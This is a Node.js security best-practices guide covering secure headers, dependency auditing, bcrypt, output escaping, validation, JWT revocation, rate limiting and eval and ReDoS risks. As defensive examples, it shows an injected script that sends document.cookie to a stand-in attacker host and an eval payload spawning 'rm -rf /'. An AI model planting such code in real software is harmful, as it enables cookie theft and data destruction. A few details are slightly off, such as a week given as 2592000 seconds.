🔗 [**Read More: Running a secure Node.js server**](/sections/security/secureserver.md)

<br/><br/>

## Comparing secret values and hashes securely

**TL;DR:** When comparing secret values or hashes like HMAC digests, you should use the [`crypto.timingSafeEqual(a, b)`](https://nodejs.org/dist/latest-v9.x/docs/api/crypto.html#crypto_crypto_timingsafeequal_a_b) function Node provides out of the box since Node.js v6.6.0. This method compares two given objects and keeps comparing even if data does not match. The default equality comparison methods would simply return after a character mismatch, allowing timing attacks based on the operation length.

**Otherwise:** Using default equality comparison operators you might expose critical information based on the time taken to compare two objects

<br/><br/>

## Generating random strings using Node.js

**TL;DR:** Using a custom-built function generating pseudo-random strings for tokens and other security-sensitive use cases might actually not be as random as you think, rendering your application vulnerable to cryptographic attacks. When you have to generate secure random strings, use the [`crypto.RandomBytes(size, [callback])`](https://nodejs.org/dist/latest-v9.x/docs/api/crypto.html#crypto_crypto_randombytes_size_callback) function using available entropy provided by the system.

**Otherwise:** When generating pseudo-random strings without cryptographically secure methods, attackers might predict and reproduce the generated results, rendering your application insecure

<br/><br/>

Going on, below we've listed some important bits of advice from the OWASP project.

## OWASP A2: Broken Authentication

- Require MFA/2FA for important services and accounts
- Rotate passwords and access keys frequently, including SSH keys
- Apply strong password policies, both for ops and in-application user management ([🔗 OWASP password recommendation](https://www.owasp.org/index.php/Authentication_Cheat_Sheet#Implement_Proper_Password_Strength_Controls.22))
- Do not ship or deploy your application with any default credentials, particularly for admin users or external services you depend on
- Use only standard authentication methods like OAuth, OpenID, etc.  - **avoid** basic authentication
- Auth rate limiting: Disallow more than _X_ login attempts (including password recovery, etc.) in a period of _Y_
- On login failure, don't let the user know whether the username or password verification failed, just return a common auth error
- Consider using a centralized user management system to avoid managing multiple accounts per employee (e.g. GitHub, AWS, Jenkins, etc) and to benefit from a battle-tested user management system

## OWASP A5:  Broken access control

- Respect the [principle of least privilege](https://en.wikipedia.org/wiki/Principle_of_least_privilege)  -  every component and DevOps person should only have access to the necessary information and resources
- **Never** work with the console/root (full-privilege) account except for account management
- Run all instances/containers on behalf of a role/service account
- Assign permissions to groups and not to users. This should make permission management easier and more transparent for most cases

## OWASP A6: Security Misconfiguration

- Access to production environment internals is done through the internal network only, use SSH or other ways, but _never_ expose internal services
- Restrict internal network access  - explicitly set which resource can access other resources (e.g. network policy or subnets)
- If using cookies, configure it to "secured" mode where it's being sent over SSL only
- If using cookies, configure it for "same site" only so only requests from same domain will get back the designated cookies
- If using cookies, prefer "HttpOnly" configuration that prevent client-side JavaScript code from accessing the cookies
- Protect each VPC with strict and restrictive access rules
- Prioritize threats using any standard security threat modeling like STRIDE or DREAD
- Protect against DDoS attacks using HTTP(S) and TCP load balancers
- Perform periodic penetration tests by specialized agencies

## OWASP A3: Sensitive Data Exposure

- Only accept SSL/TLS connections, enforce Strict-Transport-Security using headers
- Separate the network into segments (i.e. subnets) and ensure each node has the least necessary networking access permissions
- Group all services/instances that need no internet access and explicitly disallow any outgoing connection (a.k.a private subnet)
- Store all secrets in a vault products like AWS KMS, HashiCorp Vault or Google Cloud KMS
- Lockdown sensitive instance metadata using metadata
- Encrypt data in transit when it leaves a physical boundary
- Don't include secrets in log statements
- Avoid showing plain passwords in the frontend, take necessary measures in the backend and never store sensitive information in plaintext

## OWASP A9: Using Components With Known Security Vulneraibilities

- Scan docker images for known vulnerabilities (using Docker's and other vendors offer scanning services)
- Enable automatic instance (machine) patching and upgrades to avoid running old OS versions that lack security patches
- Provide the user with both 'id', 'access' and 'refresh' token so the access token is short-lived and renewed with the refresh token
- Log and audit each API call to cloud and management services (e.g who deleted the S3 bucket?) using services like AWS CloudTrail
- Run the security checker of your cloud provider (e.g. AWS security trust advisor)


## OWASP A10: Insufficient Logging & Monitoring

- Alert on remarkable or suspicious auditing events like user login, new user creation, permission change, etc
- Alert on irregular amount of login failures (or equivelant actions like forgot password)
- Include the time and username that initiated the update in each DB record

## OWASP A7: Cross-Site-Scripting (XSS)

- Use templating engines or frameworks that automatically escape XSS by design, such as EJS, Pug, React, or Angular. Learn the limitations of each mechanisms XSS protection and appropriately handle the use cases which are not covered
- Escaping untrusted HTTP request data based on the context in the HTML output (body, attribute, JavaScript, CSS, or URL) will resolve Reflected and Stored XSS vulnerabilities
- Applying context-sensitive encoding when modifying the browser document on the client-side acts against DOM XSS
- Enabling a Content-Security Policy (CSP) as a defense-in-depth mitigating control against XSS


<br/><br/><br/>

# `Using security-related headers to secure your application against common attacks`

<br/><br/>

### One Paragraph Explainer

There are security-related headers used to secure your application further. The most important headers are listed below. You can also visit the sites linked at the bottom of this page to get more information on this topic. You can easily set these headers using the [Helmet](https://www.npmjs.com/package/helmet) module for express ([Helmet for koa](https://www.npmjs.com/package/koa-helmet)).

<br/><br/>

### Table of Contents
- [HTTP Strict Transport Security (HSTS)](#http-strict-transport-security-hsts)
- [Public Key Pinning for HTTP (HPKP)](#public-key-pinning-for-http-hpkp)
- [X-Frame-Options](#x-frame-options)
- [X-XSS-Protection](#x-xss-protection)
- [X-Content-Type-Options](#x-content-type-options)
- [Referrer-Policy](#referrer-policy)
- [Expect-CT](#expect-ct)
- [Content-Security-Policy](#content-security-policy)
- [Additional Resource](#additional-resources)

<br/><br/>

### HTTP Strict Transport Security (HSTS)

HTTP Strict Transport Security (HSTS) is a web security policy mechanism to protect websites against [protocol downgrade attacks](https://en.wikipedia.org/wiki/Downgrade_attack) and [cookie hijacking](https://www.owasp.org/index.php/Session_hijacking_attack). It allows web servers to declare that web browsers (or other complying user agents) should only interact with it using __secure HTTPS connections__, and __never__ via the insecure HTTP protocol. The HSTS policy is implemented by using the `Strict-Transport-Security` header over an existing HTTPS connection.

The Strict-Transport-Security Header accepts a `max-age` value in seconds, to notify the browser how long it should access the site using HTTPS only, and an `includeSubDomains` value to apply the Strict Transport Security rule to all of the site's subdomains.

Header Example - HSTS Policy enabled for one week, include subdomains
```
Strict-Transport-Security: max-age=2592000; includeSubDomains
```

🔗 [Read on OWASP Secure Headers Project](https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#hsts)

🔗 [Read on MDN web docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security)

<br/><br/>

### Public Key Pinning for HTTP (HPKP)

HTTP Public Key Pinning (HPKP) is a security mechanism allowing HTTPS websites to resist impersonation by attackers using mis-issued or otherwise fraudulent SSL/TLS certificates.

The HTTPS web server serves a list of public key hashes, and on subsequent connections clients expect that server to use one or more of those public keys in its certificate chain. Using this feature carefully, you can greatly reduce the risk of man-in-the-middle (MITM) attacks and other false authentication problems for your application's users without incurring undue risk.

Before implementing you should have a look at the `Expect-CT` header first, due to its advanced flexibility for recovery from misconfiguration and other [advantages](https://groups.google.com/a/chromium.org/forum/m/#!msg/blink-dev/he9tr7p3rZ8/eNMwKPmUBAAJ).

The Public-Key-Pins header accepts 4 values, a `pin-sha256` value for adding the certificate public key, hashed using the SHA256 algorithm, which can be added multiple times for different public keys, a `max-age` value to tell the browser how long it should apply the rule, an `includeSubDomains` value to apply this rule to all subdomains and a `report-uri` value to report pin validation failures to the given URL.

Header Example - HPKP Policy enabled for one week, include subdomains , report failures to an example URL and allow two public keys
```
Public-Key-Pins: pin-sha256="d6qzRu9zOECb90Uez27xWltNsj0e1Md7GkYYkVoZWmM="; pin-sha256="E9CZ9INDbd+2eRQozYqqbQ2yXLVKB9+xcprMF+44U1g="; report-uri="http://example.com/pkp-report"; max-age=2592000; includeSubDomains
```

🔗 [Read on OWASP Secure Headers Project](https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#hpkp)

🔗 [Read on MDN web docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Public_Key_Pinning)

<br/><br/>

### X-Frame-Options

The X-Frame-Options header secures the application against [Clickjacking](https://www.owasp.org/index.php/Clickjacking) attacks by declaring a policy whether your application may be embedded on other (external) pages using frames.

X-Frame-Options allows 3 parameters, a `deny` parameter to disallow embedding the resource in general, a `sameorigin` parameter to allow embedding the resource on the same host/origin and an `allow-from` parameter to specify a host where embedding of the resource is allowed.

Header Example - Deny embedding of your application
```
X-Frame-Options: deny
```

🔗 [Read on OWASP Secure Headers Project](https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#xfo)

🔗 [Read on MDN web docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options)

<br/><br/>

### X-XSS-Protection

This header enables the [Cross-site scripting](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)) filter in your browser.

It accepts 4 parameters, `0` for disabling the filter, `1` for enabling the filter and enable automatic sanitization of the page, `mode=block` to enable the filter and prevent the page from rendering if a XSS attack is detected (this parameter has to be added to `1` using a semicolon, and `report=<domainToReport>` to report the violation (this parameter has to be added to `1`).

Header Example - Enable XSS Protection and report violations to example URL
```
X-XSS-Protection: 1; report=http://example.com/xss-report
```

🔗 [Read on OWASP Secure Headers Project](https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#xxxsp)

🔗 [Read on OWASP Secure Headers Project](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection)

<br/><br/>

### X-Content-Type-Options

Setting this header will prevent the browser from [interpreting files as something else](https://en.wikipedia.org/wiki/Content_sniffing) than declared by the content type in the HTTP headers.

Header Example - Disallow Content sniffing
```
X-Content-Type-Options: nosniff
```

🔗 [Read on OWASP Secure Headers Project](https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#xcto)

🔗 [Read on MDN web docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options)


<br/><br/>

### Referrer-Policy

The Referrer-Policy HTTP header governs which referrer information, sent in the `Referer` header, should be included with requests made.

It allows 8 parameters, a `no-referrer` parameter to remove the `Referer` header completely, a `no-referrer-when-downgrade` to remove the `Referer` header when downgraded for example HTTPS -> HTTP, an `origin` parameter to send the host origin (the host root) as referrer __only__, an `origin-when-cross-origin` parameter to send a full origin URL when staying on the same origin and send the host origin __only__ when otherwise, a `same-origin` parameter to send referrer information only for same-site origins and omit on cross-origin requests, a `strict-origin` parameter to keep the `Referer` header only on the same security-level (HTTPS -> HTTPS) and omit it on a less secure destination, a `strict-origin-when-cross-origin` parameter to send the full referrer URL to a same-origin destination, the origin __only__ to a cross-origin destination on the __same__ security level and no referrer on a less secure cross-origin destination, and an `unsafe-url` parameter to send the full referrer to same-origin or cross-origin destinations.

Header Example - Remove the `Referer` header completely
```
Referrer-Policy: no-referrer
```

🔗 [Read on OWASP Secure Headers Project](https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#rp)

🔗 [Read on MDN web docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy)


<br/><br/>

### Expect-CT

The Expect-CT header is used by a server to indicate that browsers should evaluate connections to the host emitting the header for [Certificate Transparency](https://www.certificate-transparency.org/) compliance.

This header accepts 3 parameters, a `report-uri` parameter to supply a URL to report Expect-CT failures to, a `enforce` parameter to signal the browser that Certificate Transparency should be enforced (rather than only reported) and refuse future connections violating the Certificate Transparency, and a `max-age` parameter to specify the number of seconds the browser regard the host as a known Expect-CT host.

Header Example - Enforce Certificate Transparency for a week and report to example URL
```
Expect-CT: max-age=2592000, enforce, report-uri="https://example.com/report-cert-transparency"
```

🔗 [Read on OWASP Secure Headers Project](https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#ect)


<br/><br/>

### Content-Security-Policy

The HTTP Content-Security-Policy response header allows to control resources the user agent is allowed to load for a given page. With a few exceptions, policies mostly involve specifying server origins and script endpoints. This helps guard against [cross-site scripting attacks (XSS)](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)).

Header Example - Enable CSP and only execute scripts from the same origin
```
Content-Security-Policy: script-src 'self'
```

There are many policies enabled with Content-Security-Policy that can be found on the sites linked below.

🔗 [Read on OWASP Secure Headers Project](https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#csp)

🔗 [Read on MDN web docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)


<br/><br/>

### Additional resources

🔗 [OWASP Secure Headers Project](https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#tab=Headers)

🔗 [Node.js Security Checklist (RisingStack)](https://blog.risingstack.com/node-js-security-checklist/)


<br/><br/>

# `Constantly and automatically inspect for vulnerable dependencies`

### One Paragraph Explainer

The majority of Node.js applications rely heavily on a large number of third party modules from npm or Yarn, both popular package registries, due to ease and speed of development. However, the downside to this benefit is the security risks of including unknown vulnerabilities into your application, which is a risk recognised by its place in the OWASP top critical web application security risks list.

There is a number of tools available to help identify third-party packages in Node.js applications which have been identified as vulnerable by the community to mitigate the risk of introducing them into your project. These can be used periodically from CLI tools or included as part of your application's build process.

### Table of Contents

- [NPM audit](#npm-audit)
- [Snyk](#snyk)
- [Greenkeeper](#greenkeeper)

### NPM Audit

`npm audit` is a new cli tool introduced with NPM@6.

Running `npm audit` will produce a report of security vulnerabilities with the affected package name, vulnerability severity and description, path, and other information, and, if available, commands to apply patches to resolve vulnerabilities.

[npm-audit]: assets/images/npm-audit.png
![npm-audit]

🔗 [Read on: NPM blog](https://docs.npmjs.com/getting-started/running-a-security-audit)

### Snyk

Snyk offers a feature-rich CLI, as well as GitHub integration. Snyk goes further with this and in addition to notifying vulnerabilities, also automatically creates new pull requests fixing vulnerabilities as patches are released for known vulnerabilities.

Snyk's feature rich website also allows for ad-hoc assessment of dependencies when provided with a GitHub repository or npm module url. You can also search for npm packages which have vulnerabilities directly.

An example of the output of the Synk GitHub integration automatically created pull request:

[snyk]: assets/images/snyk.png
![snyk]

🔗 [Read on: Snyk website](https://snyk.io/)

🔗 [Read on: Synk online tool to check npm packages and GitHub modules](https://snyk.io/test)

### Greenkeeper

Greenkeeper is a service which offers real-time dependency updates, which keeps an application more secure by always using the most update to date and patched dependency versions.

Greenkeeper watches the npm dependencies specified in a repository's `package.json` file, and automatically creates a working branch with each dependency update. The repository CI suite is then run to reveal any breaking changes for the updated dependency version in the application. If CI fails due to the dependency update, a clear and concise issue is created in the repository to be auctioned, outlining the current and updated package versions, along with information and commit history of the updated version.

An example of the output of the Greenkeeper GitHub integration automatically created pull request:

[greenkeeper]: assets/images/greenkeeper.png
![greenkeeper]
🔗 [Read on: Greenkeeper website](https://greenkeeper.io/)

### Additional resources

🔗 [Rising Stack Blog: Node.js dependency risks](https://blog.risingstack.com/controlling-node-js-security-risk-npm-dependencies/)

🔗 [NodeSource Blog: Improving npm security](https://nodesource.com/blog/how-to-reduce-risk-and-improve-security-around-npm)

<br/><br/>

# `Avoid using the Node.js Crypto library for passwords, use Bcrypt`

### One Paragraph Explainer

When storing user passwords, using an adaptive hashing algorithm such as bcrypt, offered by the [bcrypt npm module](https://www.npmjs.com/package/bcrypt) is recommended as opposed to using the native Node.js crypto module. `Math.random()` should also never be used as part of any password or token generation due to its predictability.

The `bcrypt` module or similar should be used as opposed to the JavaScript implementation, as when using `bcrypt`, a number of 'rounds' can be specified in order to provide a secure hash. This sets the work factor or the number of 'rounds' the data is processed for, and more hashing rounds leads to more secure hash (although this at the cost of CPU time). The introduction of hashing rounds means that the brute force factor is significantly reduced, as password crackers are slowed down increasing the time required to generate one attempt.

### Code example

```javascript
// asynchronously generate a secure password using 10 hashing rounds
bcrypt.hash('myPassword', 10, function(err, hash) {
  // Store secure hash in user record
});

// compare a provided password input with saved hash
bcrypt.compare('somePassword', hash, function(err, match) {
  if(match) {
   // Passwords match
  } else {
   // Passwords don't match
  } 
});
```

### What other bloggers say

From the blog by [Max McCarty](https://dzone.com/articles/nodejs-and-password-storage-with-bcrypt):
> ... it’s not just using the right hashing algorithm. I’ve talked extensively about how the right tool also includes the necessary ingredient of “time” as part of the password hashing algorithm and what it means for the attacker who’s trying to crack passwords through brute-force.

<br/><br/>

# `Escape Output`

### One Paragraph Explainer

HTML and other web languages mix content with executable code - a single HTML paragraph might contain a visual representation of data along with JavaScript execution instructions. When rendering HTML or returning data from API, what we believe is a pure content might actually embody JavaScript code that will get interpreted and executed by the browser. This happens, for example, when we render content that was inserted by an attacker to a database - for example `<div><script>//malicious code</script></div>`. This can be mitigated by instructing the browser to treat any chunk of untrusted data as content only and never interpret it - this technique is called escaping. Many npm libraries and HTML templating engines provide escaping capabilities (example: [escape-html](https://github.com/component/escape-html), [node-esapi](https://github.com/ESAPI/node-esapi)). Not only HTML content should be escaped but also CSS and JavaScript


### Code example - Don't put untrusted data into your HTML 

```javascript
<script>...NEVER PUT UNTRUSTED DATA HERE...</script>   directly in a script
 
 <!--...NEVER PUT UNTRUSTED DATA HERE...-->             inside an HTML comment
 
 <div ...NEVER PUT UNTRUSTED DATA HERE...=test />       in an attribute name
 
 <NEVER PUT UNTRUSTED DATA HERE... href="/test" />   in a tag name
 
 <style>...NEVER PUT UNTRUSTED DATA HERE...</style>   directly in CSS

```

### Code example - Malicious content that might be injected into a DB

```javascript
<div>
  <b>A pseudo comment to the a post</b>
  <script>
    window.location='http://attacker/?cookie='+document.cookie
</script>
</div>

```

<br/><br/>

### Blog Quote: "When we don’t want the characters to be interpreted"

From the Blog [benramsey.com](https://benramsey.com/articles/escape-output/)
> Data may leave your application in the form of HTML sent to a Web browser, SQL sent to a database, XML sent to an RSS reader, WML sent to a wireless device, etc. The possibilities are limitless. Each of these has its own set of special characters that are interpreted differently than the rest of the plain text received. Sometimes we want to send these special characters so that they are interpreted (HTML tags sent to a Web browser, for example), while other times (in the case of input from users or some other source), we don’t want the characters to be interpreted, so we need to escape them.

> Escaping is also sometimes referred to as encoding. In short, it is the process of representing data in a way that it will not be executed or interpreted. For example, HTML will render the following text in a Web browser as bold-faced text because the <strong> tags have special meaning: 
<strong>This is bold text.</strong>
But, suppose I want to render the tags in the browser and avoid their interpretation. Then, I need to escape the angle brackets, which have special meaning in HTML. The following illustrates the escaped HTML:

&lt;strong&gt;This is bold text.&lt;/strong&gt;


<br/><br/>

### Blog Quote: "OWASP recommends using a security-focused encoding library"

From the blog OWASP [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
> "Writing these encoders is not tremendously difficult, but there are quite a few hidden pitfalls. For example, you might be tempted to use some of the escaping shortcuts like \" in JavaScript. However, these values are dangerous and may be misinterpreted by the nested parsers in the browser. You might also forget to escape the escape character, which attackers can use to neutralize your attempts to be safe. **OWASP recommends using a security-focused encoding library to make sure these rules are properly implemented**."


<br/><br/>

### Blog Quote: "You MUST use the escape syntax for the part of the HTML"

From the blog OWASP [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
> "But HTML entity encoding doesn't work if you're putting untrusted data inside a <script> tag anywhere, or an event handler attribute like onmouseover, or inside CSS, or in a URL. So even if you use an HTML entity encoding method everywhere, you are still most likely vulnerable to XSS. You MUST use the escape syntax for the part of the HTML document you're putting untrusted data into."

<br/><br/>

# `Validate the incoming JSON schemas`

### One Paragraph Explainer

Validation is about being very explicit on what payload our app is willing to accept and failing fast should the input deviates from the expectations. This minimizes an attackers surface who can no longer try out payloads with a different structure, values and length. Practically it prevents attacks like DDOS (code is unlikely to fail when the input is well defined) and Insecure Deserialization (JSON contain no surprises). Though validation can be coded or rely upon classes and types (TypeScript, ES6 classes) the community seems to increasingly like JSON-based schemas as these allow declaring complex rules without coding and share the expectations with the frontend. JSON-schema is an emerging standard that is supported by many npm libraries and tools (e.g. [jsonschema](https://www.npmjs.com/package/jsonschema), [Postman](http://blog.getpostman.com/2017/07/28/api-testing-tips-from-a-postman-professional/)), [joi](https://www.npmjs.com/package/joi) is also highly popular with sweet syntax. Typically JSON syntax can't cover all validation scenario and custom code or pre-baked validation frameworks like [validator.js](https://github.com/chriso/validator.js/) come in handy. Regardless of the chosen syntax, ensure to run the validation as early as possible - For example, by using Express middleware that validates the request body before the request is passed to the route handler

### Example - JSON-Schema validation rules

``` javascript
{
    "$schema": "http://json-schema.org/draft-06/schema#",
    "title": "Product",
    "description": "A product from Acme's catalog",
    "type": "object",
    "properties": {
        "name": {
            "description": "Name of the product",
            "type": "string"
        },
        "price": {
            "type": "number",
            "exclusiveMinimum": 0
        }
    },
    "required": ["id", "name", "price"]
}
```


### Example - Validating an entity using JSON-Schema

``` javascript
const JSONValidator = require("jsonschema").Validator;

class Product {
  
  validate() {
    var v = new JSONValidator();

    return v.validate(this, schema);
  }

  static get schema() {
    //define JSON-Schema, see example above
  }
}

```

### Example - Usage of middleware validator

``` javascript
// The validator is a generic middleware that gets the entity it should validate and takes care to return
// HTTP status 400 (Bad Request) should the body payload validation fail
router.post("/" , **validator(Product.validate)**, async (req, res, next) => {
    // route handling code goes here
});

```



### What other bloggers say

From the blog [Gergely Nemeth](https://nemethgergely.com/nodejs-security-overview/):
> Validating user input is one of the most important things to do when it comes to the security of your application. Failing to do it correctly can open up your application and users to a wide range of attacks, including command injection, SQL injection or stored cross-site scripting.<br/>

To validate user input, one of the best libraries you can pick is joi. Joi is an object schema description language and validator for JavaScript objects.

<br/><br/>

# `Support blacklisting JWTs`

### One Paragraph Explainer

By design, JWTs (JSON Web Tokens) are completely stateless, so once a valid token is signed by an issuer, the token may be verified as authentic by the application. The problem this leads to is the security concern where a leaked token could still be used and unable to be revoked, due to the signature remaining valid as long as the signature provided by the issues matches what the application is expecting.
Due to this, when using JWT authentication, an application should manage a blacklist of expired or revoked tokens to retain user's security in the case a token needs to be revoked.

### `express-jwt-blacklist` example

An example of running `express-jwt-blacklist` on a Node.js project using the `express-jwt`. Note that it is important to not use the default store settings(in-memory) cache of `express-jwt-blacklist`, but to use an external store such as Redis to revoke tokens across many Node.js processes.

```javascript
const jwt = require('express-jwt');
const blacklist = require('express-jwt-blacklist');

blacklist.configure({
  tokenId: 'jti',
  strict: true,
  store: {
    type: 'memcached',
    host: '127.0.0.1'
    port: 11211,
    keyPrefix: 'mywebapp:',
    options: {
      timeout: 1000
    }
  }
});
 
app.use(jwt({
  secret: 'my-secret',
  isRevoked: blacklist.isRevoked
}));
 
app.get('/logout', function (req, res) {
  blacklist.revoke(req.user)
  res.sendStatus(200);
});
```

### What other bloggers say

From the blog by [Marc Busqué](http://waiting-for-dev.github.io/blog/2017/01/25/jwt_secure_usage/):
> ...add a revocation layer on top of JWT, even if it implies losing its stateless nature.

<br/><br/>

# `Prevent brute-force attacks against authorization`

### One Paragraph Explainer

Leaving higher privileged routes such as `/login` or `/admin` exposed without rate limiting leaves an application at risk of brute force password dictionary attacks. Using a strategy to limit requests to such routes can prevent the success of this by limiting the number of allow attempts based on a request property such as ip, or a body parameter such as username/email address.

### Code example: count consecutive failed authorisation attempts by user name and IP pair and total fails by IP address.

Using [rate-limiter-flexible](https://www.npmjs.com/package/rate-limiter-flexible) npm package.

Create two limiters: 
1. The first counts number of consecutive failed attempts and allows maximum 10 by username and IP pair. 
2. The second blocks IP address for a day on 100 failed attempts per day.

```javascript
const maxWrongAttemptsByIPperDay = 100;
const maxConsecutiveFailsByUsernameAndIP = 10;

const limiterSlowBruteByIP = new RateLimiterRedis({
  storeClient: redisClient,
  keyPrefix: 'login_fail_ip_per_day',
  points: maxWrongAttemptsByIPperDay,
  duration: 60 * 60 * 24,
  blockDuration: 60 * 60 * 24, // Block for 1 day, if 100 wrong attempts per day
});

const limiterConsecutiveFailsByUsernameAndIP = new RateLimiterRedis({
  storeClient: redisClient,
  keyPrefix: 'login_fail_consecutive_username_and_ip',
  points: maxConsecutiveFailsByUsernameAndIP,
  duration: 60 * 60 * 24 * 90, // Store number for 90 days since first fail
  blockDuration: 60 * 60, // Block for 1 hour
});
```

See complete example on [rate-limiter-flexible package's Wiki](https://github.com/animir/node-rate-limiter-flexible/wiki/Overall-example#login-endpoint-protection).

### What other bloggers say

From the Essential Node.js Security book by [Liran Tal](https://leanpub.com/nodejssecurity):
> Brute-force attacks may be employed by an attacker to send a series of username/password pairs to your REST end-points over POST or another RESTful API that you have opened to implement them. Such a dictionary attack is very straight-forward and easy to execute and may be performed on any other parts of your API or page routing, unrelated to logins.


<br/><br/>

# `Run Node.js as Non-Root User`

### One Paragraph Explainer

According to the 'Principle of least privilege' a user/process must be able to access only the necessary information and resources. Granting root access to an attacker opens a whole new world of malicious ideas like routing traffic to other servers. In practice, most Node.js apps don't need root access and don't run with such privileges. However, there are two common scenarios that might push to root usage:

- to gain access to privilege port (e.g. port 80) Node.js must run as root
- Docker containers by default run as root(!). It's recommended for Node.js web applications to listen on non-privileged ports and rely on a reverse-proxy like nginx to redirect incoming traffic from port 80 to your Node.js application. When building a Docker image, highly secured apps should run the container with an alternate non-root user. Most Docker clusters (e.g. Swarm, Kubernetes) allow setting the security context declaratively

### Code example - Building a Docker image as non-root

```javascript
FROM node:latest
COPY package.json .
RUN npm install
COPY . .
EXPOSE 3000
USER node
CMD ["node", "server.js"]
```

<br/><br/>

### Blog Quote: "By default, Docker runs container as root"

From the Repository docker-node by [eyalzek](https://github.com/nodejs/docker-node/blob/master/docs/BestPractices.md#non-root-user):
> By default, Docker runs container as root which inside of the container can pose as a security issue. You would want to run the container as an unprivileged user wherever possible. The node images provide the node user for such purpose. The Docker Image can then be run with the node user in the following way: "-u 'node'"

<br/><br/>

### Blog Quote: "The attacker will have total control over your machine"

From the blog Don't run Node.js as root by [Olivier Lalonde](http://syskall.com/dont-run-node-dot-js-as-root/):
> Indeed, if you are running your server as root and it gets hacked through a vulnerability in your code, the attacker will have total control over your machine. This means the attacker could potentially wipe out your whole disk or worse. On the other hand, if your server runs with the permissions of a regular user, the attacker will be limited by those permissions.

<br/><br/>

### Blog Quote: "If you need to run your application on port 80 or 443, you can do port forwarding"

From the blog Developing Secure Node.js Applications — A Broad Guide by [Deepal Jayasekara](https://jsblog.insiderattack.net/developing-secure-node-js-applications-a-broad-guide-286afdec69ce):
> Never run Node.js as root. Running node.js as root will make it worse if an attacker somehow gains control over your application. In this scenario, attacker would also gain root privileges which could result in a catastrophe. If you need to run your application on port 80 or 443, you can do port forwarding using iptables or you can place a front-end proxy such as nginx or apache which routes request from port 80 or 443 to your application

<br/><br/>

# `Limit payload size using a reverse-proxy or a middleware`

### One Paragraph Explainer

Parsing request bodies, for example JSON-encoded payloads, is a performance-heavy operation, especially with larger requests.
When handling incoming requests in your web application, you should limit the size of their respective payloads. Incoming requests with
unlimited body/payload sizes can lead to your application performing badly or crashing due to a denial-of-service outage or other unwanted side-effects.
Many popular middleware-solutions for parsing request bodies, such as the already-included `body-parser` package for express, expose
options to limit the sizes of request payloads, making it easy for developers to implement this functionality. You can also
integrate a request body size limit in your reverse-proxy/web server software if supported. Below are examples for limiting request sizes using
`express` and/or `nginx`.

### Example code for `express`

```javascript
const express = require('express');

const app = express();

app.use(express.json({ limit: '300kb' })); // body-parser defaults to a body size limit of 100kb

// Request with json body
app.post('/json', (req, res) => {

    // Check if request payload content-type matches json, because body-parser does not check for content types
    if (!req.is('json')) {
        return res.sendStatus(415); // -> Unsupported media type if request doesn't have JSON body
    }

    res.send('Hooray, it worked!');
});

app.listen(3000, () => console.log('Example app listening on port 3000!'));
```

🔗 [**Express docs for express.json()**](http://expressjs.com/en/4x/api.html#express.json)

### Example configuration for `nginx`

```
http {
    ...
    # Limit the body size for ALL incoming requests to 1 MB
    client_max_body_size 1m;
}

server {
    ...
    # Limit the body size for incoming requests to this specific server block to 1 MB
    client_max_body_size 1m;
}

location /upload {
    ...
    # Limit the body size for incoming requests to this route to 1 MB
    client_max_body_size 1m;
}
```

🔗 [**Nginx docs for client_max_body_size**](http://nginx.org/en/docs/http/ngx_http_core_module.html#client_max_body_size)

<br/><br/>

# `Avoid JS eval statements`

### One Paragraph Explainer

`eval()`, `setTimeout()`, `setInterval()`, and `new Function()` are global functions, often used in Node.js, which accept a string parameter representing a JavaScript expression, statement, or sequence of statements. The security concern of using these functions is the possibility that untrusted user input might find its way into code execution leading to server compromise, as evaluating user code essentially allows an attacker to perform any actions that you can. It is suggested to refactor code to not rely on the usage of these functions where user input could be passed to the function and executed.

### Code example

```javascript
// example of malicious code which an attacker was able to input
userInput = "require('child_process').spawn('rm', ['-rf', '/'])";

// malicious code executed
eval(userInput);
```

### What other bloggers say

From the Essential Node.js Security book by [Liran Tal](https://leanpub.com/nodejssecurity):
> The eval() function is perhaps of the most frowned upon JavaScript pieces from a security
perspective. It parses a JavaScript string as text, and executes it as if it were a JavaScript code.
Mixing that with untrusted user input that might find it’s way to eval() is a recipe for disaster that
can end up with server compromise.

<br/><br/>

# `Prevent malicious RegEx from overloading your single thread execution`

### One Paragraph Explainer

The risk that is inherent with the use of Regular Expressions is the computational resources that require to parse text and match a given pattern. For the Node.js platform, where a single-thread event-loop is dominant, a CPU-bound operation like resolving a regular expression pattern will render the application unresponsive.
Avoid RegEx when possible or defer the task to a dedicated library like [validator.js](https://github.com/chriso/validator.js), or [safe-regex](https://github.com/substack/safe-regex) to check if the RegEx pattern is safe.

Some [OWASP examples](https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS) for vulnerable RegEx patterns:
* (a|aa)+
* ([a-zA-Z]+)*

<br/><br/>

### Code Example – Enabling SSL/TLS using the Express framework

```javascript
var saferegex = require('safe-regex');
var emailRegex = /^([a-zA-Z0-9])(([\-.]|[_]+)?([a-zA-Z0-9]+))*(@){1}[a-z0-9]+[.]{1}(([a-z]{2,3})|([a-z]{2,3}[.]{1}[a-z]{2,3}))$/;

// should output false because the emailRegex is vulnerable to redos attacks
console.log(saferegex(emailRegex));

// instead of the regex pattern, use validator:
var validator = require('validator');
console.log(validator.isEmail('liran.tal@gmail.com'));
```

<br/><br/>

### Book Quote: "A vulnerable Regular Expression is known as one which applies repetition"

